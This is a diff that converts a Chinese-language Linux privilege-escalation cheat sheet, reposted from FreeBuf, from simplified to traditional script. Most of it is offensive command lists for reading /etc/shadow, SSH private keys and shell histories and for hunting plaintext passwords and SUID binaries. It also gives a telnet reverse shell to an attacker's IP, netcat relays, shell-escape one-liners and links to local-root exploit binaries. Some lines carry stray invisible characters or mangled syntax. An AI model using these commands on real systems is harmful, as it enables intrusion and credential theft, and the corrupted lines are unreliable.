@@ -1,24 +1,24 @@
-    文中有的命令可能在你的主机上敲不出来，因为它可能是在其他版本的linux中所使用的命令。
+    文中有的命令可能在你的主機上敲不出來，因為它可能是在其他版本的linux中所使用的命令。
 
-##系统类型
+##系統類型
 
-###系统是什么版本?
+###系統是什麼版本?
 ```bash
 cat /etc/issue
 cat /etc/*-release
 cat /etc/lsb-release
 cat /etc/redhat-release
 ```
-###它的内核版本是什么？
+###它的內核版本是什麼？
 ```bash
-cat /proc/version  
+cat /proc/version
 uname -a
 uname -mrs
 rpm -q kernel
 dmesg | grep Linux
 ls /boot | grep vmlinuz
 ```
-###它的环境变量里有些什么？
+###它的環境變量裡有些什麼？
 ```bash
 cat /etc/profile
 cat /etc/bashrc
@@ -28,26 +28,26 @@ cat ~/.bash_logout
 env
 set
 ```
-###是否有台打印机？
+###是否有台打印機？
 ```bash
 lpstat -a
 ```
 
-##应用与服务
+##應用與服務
 
-###正在运行什么服务？什么样的服务具有什么用户权限？
+###正在運行什麼服務？什麼樣的服務具有什麼用戶權限？
 ```bash
 ps aux
 ps -ef
 top
 cat /etc/service
 ```
-###哪些服务具有root的权限？这些服务里你看起来那些有漏洞,进行再次检查！
+###哪些服務具有root的權限？這些服務裡你看起來那些有漏洞,進行再次檢查！
 ```bash
 ps aux | grep root
 ps -ef | grep root
 ```
-###安装了哪些应用程序？他们是什么版本？哪些是当前正在运行的？
+###安裝了哪些應用程序？他們是什麼版本？哪些是當前正在運行的？
 ```bash
 ls -alh /usr/bin/
 ls -alh /sbin/
@@ -56,7 +56,7 @@ rpm -qa
 ls -alh /var/cache/apt/archivesO
 ls -alh /var/cache/yum/
 ```
-###Service设置，有任何的错误配置吗？是否有任何（脆弱的）的插件？
+###Service設置，有任何的錯誤配置嗎？是否有任何（脆弱的）的插件？
 ```bash
 cat /etc/syslog.conf
 cat /etc/chttp.conf
@@ -69,7 +69,7 @@ cat /etc/httpd/conf/httpd.conf
 cat /opt/lampp/etc/httpd.conf
 ls -aRl /etc/ | awk ‘$1 ~ /^.*r.*/
 ```
-###主机上有哪些工作计划？
+###主機上有哪些工作計劃？
 ```bash
 crontab -l
 ls -alh /var/spool/cron
@@ -84,23 +84,23 @@ cat /etc/crontab
 cat /etc/anacrontab
 cat /var/spool/cron/crontabs/root
 ```
-###主机上可能有哪些纯文本用户名和密码?
+###主機上可能有哪些純文本用戶名和密碼?
 ```bash
 grep -i user [filename]
 grep -i pass [filename]
 grep -C 5 "password" [filename]
-find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
+find . -name "*.php" -print0 | xargs -0 grep -i -n "​​var $password" # Joomla
 ```
 
-##通信与网络
+##通信與網絡
 
-###NIC(s)，系统有哪些？它是连接到哪一个网络？
+###NIC(s)，系統有哪些？它是連接到哪一個網絡？
 ```bash
 /sbin/ifconfig -a
 cat /etc/network/interfaces
 cat /etc/sysconfig/network
 ```
-###网络配置设置是什么？网络中有什么样的服务器？DHCP服务器？DNS服务器？网关？
+###網絡配置設置是什麼？網絡中有什麼樣的服務器？ DHCP服務器？ DNS服務器？網關？
 ```bash
 cat /etc/resolv.conf
 cat /etc/sysconfig/network
@@ -109,7 +109,7 @@ iptables -L
 hostname
 dnsdomainname
 ```
-###其他用户主机与系统的通信？
+###其他用戶主機與系統的通信？
 ```bash
 lsof -i
 lsof -i :80
@@ -122,25 +122,25 @@ chkconfig --list | grep 3:on
 last
 w
 ```
-###缓存？IP和/或MAC地址?
+###緩存？ IP和/或MAC地址?
 ```bash
 arp -e
 route
 /sbin/route -nee
 ```
-###数据包可能嗅探吗？可以看出什么？监听流量
+###數據包可能嗅探嗎？可以看出什麼？監聽流量
 ```bash
 # tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
 tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21
 ```
-###你如何get一个shell？你如何与系统进行交互？
+###你如何get一個shell？你如何與系統進行交互？
 ```bash
 # http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
-nc -lvp 4444    # Attacker. 输入 (命令)
-nc -lvp 4445    # Attacker. 输出(结果)
-telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # 在目标系统上. 使用 攻击者的IP!
+nc -lvp 4444 # Attacker. 輸入 (命令)
+nc -lvp 4445 # Attacker. 輸出(結果)
+telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445 # 在目標系統上. 使用攻擊者的IP!
 ```
-###如何端口转发？（端口重定向）
+###如何端口轉發？ （端口重定向）
 ```bash
 # rinetd
 # http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch
@@ -149,55 +149,55 @@ telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # 在目标系统上.
 FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
 #ssh
 # ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
-ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
-ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
+ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port
+ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port
 #mknod
-# mknod backpipe p ; nc -l -p [remote port] < backpipe  | nc [local IP] [local port] >backpipe
-mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe    # Port Relay
-mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
+# mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe
+mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe # Port Relay
+mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe # Proxy (Port 80 to 8080)
 mknod
 backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc
-localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
+localhost 80 | tee -a outflow & 1>backpipe # Proxy monitor (Port 80 to 8080)
 ```
-###建立隧道可能吗？本地，远程发送命令
+###建立隧道可能嗎？本地，遠程發送命令
 ```bash
 ssh -D 127.0.0.1:9050 -N [username]@[ip]
 proxychains ifconfig
 ```
 
-##秘密信息和用户
+##秘密信息和用戶
 
-###你是谁？哪个id登录？谁已经登录？还有谁在这里？谁可以做什么呢？
+###你是誰？哪個id登錄？誰已經登錄？還有誰在這裡？誰可以做什麼呢？
 ```bash
 id
 who
 w
 last
-cat /etc/passwd | cut -d:    # List of users
-grep -v -E "^#" /etc/passwd | awk -F: &#039;$3 == 0 { print $1}'   # List of super users
-awk -F: '($3 == "0") {print}&#039; /etc/passwd   # List of super users
+cat /etc/passwd | cut -d: # List of users
+grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}' # List of super users
+awk -F: '($3 == "0") {print}' /etc/passwd # List of super users
 cat /etc/sudoers
 sudo -l
 ```
-###可以找到什么敏感文件？
+###可以找到什麼敏感文件？
 ```bash
 cat /etc/passwd
 cat /etc/group
 cat /etc/shadow
 ls -alh /var/mail/
 ```
-###什么有趣的文件在home/directorie（S）里？如果有权限访问
+###什麼有趣的文件在home/directorie（S）裡？如果有權限訪問
 ```bash
 ls -ahlR /root/
 ls -ahlR /home/
 ```
-###是否有任何密码，脚本，数据库，配置文件或日志文件？密码默认路径和位置
+###是否有任何密碼，腳本，數據庫，配置文件或日誌文件？密碼默認路徑和位置
 ```bash
 cat /var/apache2/config.inc
 cat /var/lib/mysql/mysql/user.MYD
 cat /root/anaconda-ks.cfg
 ```
-###用户做过什么？是否有任何密码呢？他们有没有编辑什么？
+###用戶做過什麼？是否有任何密碼呢？他們有沒有編輯​​什麼？
 ```bash
 cat ~/.bash_history
 cat ~/.nano_history
@@ -205,14 +205,14 @@ cat ~/.atftp_history
 cat ~/.mysql_history
 cat ~/.php_history
 ```
-###可以找到什么样的用户信息
+###可以找到什麼樣的用戶信息
 ```bash
 cat ~/.bashrc
 cat ~/.profile
 cat /var/mail/root
 cat /var/spool/mail/root
 ```
-###private-key 信息能否被发现？
+###private-key 信息能否被發現？
 ```bash
 cat ~/.ssh/authorized_keys
 cat ~/.ssh/identity.pub
@@ -230,17 +230,17 @@ cat /etc/ssh/ssh_host_rsa_key
 cat /etc/ssh/ssh_host_key.pub
 cat /etc/ssh/ssh_host_key
 ```
-##文件系统
-###哪些用户可以写配置文件在/ etc /？能够重新配置服务？
+##文件系統
+###哪些用戶可以寫配置文件在/ etc /？能夠重新配置服務？
 ```bash
-ls -aRl /etc/ | awk ‘$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
-ls -aRl /etc/ | awk ’$1 ~ /^..w/' 2>/dev/null        # Owner
-ls -aRl /etc/ | awk ‘$1 ~ /^.....w/' 2>/dev/null    # Group
-ls -aRl /etc/ | awk ’;$1 ~ /w.$/' 2>/dev/null          # Other
-find /etc/ -readable -type f 2>/dev/null                         # Anyone
-find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
+ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null # Anyone
+ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null # Owner
+ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null # Group
+ls -aRl /etc/ | awk ';$1 ~ /w.$/' 2>/dev/null # Other
+find /etc/ -readable -type f 2>/dev/null # Anyone
+find /etc/ -readable -type f -maxdepth 1 2>/dev/null # Anyone
 ```
-###在/ var /有什么可以发现？
+###在/ var /有什麼可以發現？
 ```bash
 ls -alh /var/log
 ls -alh /var/mail
@@ -248,9 +248,9 @@ ls -alh /var/spool
 ls -alh /var/spool/lpd
 ls -alh /var/lib/pgsql
 ls -alh /var/lib/mysql
-cat /var/lib/dhcp3/dhclient.leases
+cat /var/lib/dh​​cp3/dhclient.leases
 ```
-##网站上的任何隐藏配置/文件?配置文件与数据库信息？
+##網站上的任何隱藏配置/文件?配置文件與數據庫信息？
 ```bash
 ls -alhR /var/www/
 ls -alhR /srv/www/htdocs/
@@ -258,7 +258,7 @@ ls -alhR /usr/local/www/apache22/data/
 ls -alhR /opt/lampp/htdocs/
 ls -alhR /var/www/html/
 ```
-###有什么在日志文件里?（什么能够帮助到“本地文件包含”?)
+###有什麼在日誌文件裡?（什麼能夠幫助到“本地文件包含”?)
 ```bash
 # http://www.thegeekstuff.com/2011/08/linux-var-log-files/
 cat /etc/httpd/logs/access_log
@@ -295,13 +295,13 @@ cat /var/run/utmp
 cat /var/webmin/miniserv.log
 cat /var/www/logs/access_log
 cat /var/www/logs/access.log
-ls -alh /var/lib/dhcp3/
+ls -alh /var/lib/dh​​cp3/
 ls -alh /var/log/postgresql/
 ls -alh /var/log/proftpd/
 ls -alh /var/log/samba/
 #
 auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info,
-mail.log, mail.warn, messages, syslog, udev, wtmp(有什么文件?log.系统引导……)
+mail.log, mail.warn, messages, syslog, udev, wtmp(有什麼文件?log.系統引導……)
 ```
 ###如果命令限制，你可以打出哪些突破它的限制？
 ```bash
@@ -309,51 +309,51 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 echo os.system('/bin/bash')
 /bin/sh -i
 ```
-###如何安装文件系统？
+###如何安裝文件系統？
 ```bash
 mount
 df -h
 ```
-###是否有挂载的文件系统？
+###是否有掛載的文件系統？
 ```bash
 cat /etc/fstab
 ```
-###什么是高级Linux文件权限使用？Sticky bits, SUID 和GUID
+###什麼是高級Linux文件權限使用？ Sticky bits, SUID 和GUID
 ```bash
-find / -perm -1000 -type d 2>/dev/null    # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here
-find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the  group, not the user who started it.
-find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the  owner, not the user who started it.
-find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
-for i in `locate -r "bin$"`; do find $i ( -perm -4000 -o -perm -2000 ) -type f 2>/dev/null; done    #
-Looks in &#039;common&#039; places: /bin, /sbin, /usr/bin, /usr/sbin,
+find / -perm -1000 -type d 2>/dev/null # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here
+find / -perm -g=s -type f 2>/dev/null # SGID (chmod 2000) - run as the group, not the user who started it.
+find / -perm -u=s -type f 2>/dev/null # SUID (chmod 4000) - run as the owner, not the user who started it.
+find / -perm -g=s -o -perm -u=s -type f 2>/dev/null # SGID or SUID
+for i in `locate -r "bin$"`; do find $i ( -perm -4000 -o -perm -2000 ) -type f 2>/dev/null; done #
+Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin,
 /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID
 (Quicker search)
 #
 findstarting at root (/), SGIDorSUID, not Symbolic links, only 3
-folders deep, list with more detail and hideany errors (e.g. permission
+folders deep, list with more detail and hideany errors (eg permission
 denied)
-find/-perm -g=s-o-perm -4000! -type l-maxdepth 3 -exec ls -ld {} ;2>/dev/null
+find/-perm -g=so-perm -4000! -type l-maxdepth 3 -exec ls -ld {} ;2>/dev/null
 ```
-###在哪些目录可以写入和执行呢？几个“共同”的目录：/ tmp目录，/var / tmp目录/ dev /shm目录
+###在哪些目錄可以寫入和執行呢？幾個“共同”的目錄：/ tmp目錄，/var / tmp目錄/ dev /shm目錄
 ```bash
-find / -writable -type d 2>/dev/null        # world-writeable folders
-find / -perm -222 -type d 2>/dev/null      # world-writeable folders
-find / -perm -o+w -type d 2>/dev/null    # world-writeable folders
-find / -perm -o+x -type d 2>/dev/null    # world-executable folders
-find / ( -perm -o+w -perm -o+x ) -type d 2>/dev/null   # world-writeable & executable folders
-Any "problem" files？可写的的，“没有使用"的文件
-find / -xdev -type d ( -perm -0002 -a ! -perm -1000 ) -print   # world-writeable files
-find /dir -xdev ( -nouser -o -nogroup ) -print   # Noowner files
+find / -writable -type d 2>/dev/null # world-writeable folders
+find / -perm -222 -type d 2>/dev/null # world-writeable folders
+find / -perm -o+w -type d 2>/dev/null # world-writeable folders
+find / -perm -o+x -type d 2>/dev/null # world-executable folders
+find / ( -perm -o+w -perm -o+x ) -type d 2>/dev/null # world-writeable & executable folders
+Any "problem" files？可寫的的，“沒有使用"的文件
+find / -xdev -type d ( -perm -0002 -a ! -perm -1000 ) -print # world-writeable files
+find /dir -xdev ( -nouser -o -nogroup ) -print # Noowner files
 ```
-##准备和查找漏洞利用代码
-###安装了什么开发工具/语言/支持？
+##準備和查找漏洞利用代碼
+###安裝了什麼開發工具/語言/支持？
 ```bash
 find / -name perl*
 find / -name python*
 find / -name gcc*
 find / -name cc
 ```
-###如何上传文件？
+###如何上傳文件？
 ```bash
 find / -name wget
 find / -name nc*
@@ -361,7 +361,7 @@ find / -name netcat*
 find / -name tftp*
 find / -name ftp
 ```
-###查找exploit代码
+###查找exploit代碼
 
 http://www.exploit-db.com
 
@@ -381,7 +381,7 @@ http://seclists.org/fulldisclosure/
 
 http://www.google.com
 
-###查找更多有关漏洞的信息
+###查找更多有關漏洞的信息
 
 http://www.cvedetails.com
 
@@ -393,34 +393,34 @@ http://www.vulnview.com/cve-details.php?cvename=[CVE]]http://www.vulnview.com/cv
 
 http://www.91ri.org/
 
-###(快速）“共同的“exploit,预编译二进制代码文件
+###(快速）“共同的“exploit,預編譯二進制代碼文件
 
 http://tarantula.by.ru/localroot/
 
 http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/
 
-###上面的信息很难吗？
+###上面的信息很難嗎？
 
-快去使用第三方脚本/工具来试试吧！
+快去使用第三方腳本/工具來試試吧！
 
-系统怎么打内核，操作系统，所有应用程序，插件和Web服务的最新补丁？
+系統怎麼打內核，操作系統，所有應用程序，插件和Web服務的最新補丁？
 
 ```bash
 apt-get update && apt-get upgrade
 yum update
 ```
-###服务运行所需的最低的权限？
+###服務運行所需的最低的權限？
 
-例如，你需要以root身份运行MySQL？
-能够从以下网站找到自动运行的脚本？！
+例如，你需要以root身份運行MySQL？
+能夠從以下網站找到自動運行的腳本？ ！
 
-http://pentestmonkey.net/tools/unix-privesc-check/
+http://pentestmonkey.net/tool​​s/unix-privesc-check/
 
 http://labs.portcullis.co.uk/application/enum4linux/
 
 http://bastille-linux.sourceforge.net
 
-###（快速）指南和链接
+###（快速）指南和鏈接
 
 例如
 
@@ -437,6 +437,6 @@ http://pentest.cryptocity.net/files/clientsides/post_exploitation_fall09.pdf
 http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html
 
 
-##转载出自
+##轉載出自
 
 FreebuF.COM
